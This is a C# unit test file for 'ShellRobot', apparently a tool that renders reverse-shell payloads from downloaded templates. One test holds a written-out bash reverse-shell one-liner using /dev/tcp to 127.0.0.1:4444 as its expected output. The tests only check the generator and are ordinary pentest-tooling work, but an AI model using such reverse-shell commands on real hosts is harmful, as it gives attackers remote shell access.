using System;

using System.IO;
using System.Threading.Tasks;

using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace ShellRobot.Shared.Testing
{
    [TestClass]
    public class ShellRobotLibraryTest
    {
        [TestMethod]
        public async Task TestCheckUpdateAsync()
        {
            // Setup random working directory for ShellRobot instance
            var workingDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Environment.SetEnvironmentVariable("SHELLROBOT_HOME", workingDirectory);
            
            var instance = new ShellRobot();
            var result = await instance.CheckUpdateAsync();
            
            // Recursively delete any file and directory inside workingDirectory
            Directory.Delete(workingDirectory, true);
            
            Assert.AreEqual(true, result);
        }

        [TestMethod]
        public async Task TestUpdateAsyncAndListTemplatesAsync()
        {
            // Setup random working directory for ShellRobot instance
            var workingDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Environment.SetEnvironmentVariable("SHELLROBOT_HOME", workingDirectory);
            
            var instance = new ShellRobot();
            await instance.UpdateAsync();

            // This test waits for at least one template available at shell-robot-templates repo
            var templates = await instance.ListTemplatesAsync();
            
            // Recursively delete any file and directory inside workingDirectory
            Directory.Delete(workingDirectory, true);
            
            Assert.IsTrue(templates.Count >= 1);
        }
        
        [TestMethod]
        public async Task TestGenerateGenericBashRevShell()
        {
            // Setup random working directory for ShellRobot instance
            var workingDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Environment.SetEnvironmentVariable("SHELLROBOT_HOME", workingDirectory);
            
            var instance = new ShellRobot();
            await instance.UpdateAsync();

            var revShell = await instance.ParseTemplateAsync("Bash Reverse Shell", new[]
            {
                "address",
                "127.0.0.1",
                "port",
                "4444"
            });
            
            // Recursively delete any file and directory inside workingDirectory
            Directory.Delete(workingDirectory, true);
            
            Assert.IsTrue(revShell == "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1");
        }
    }
}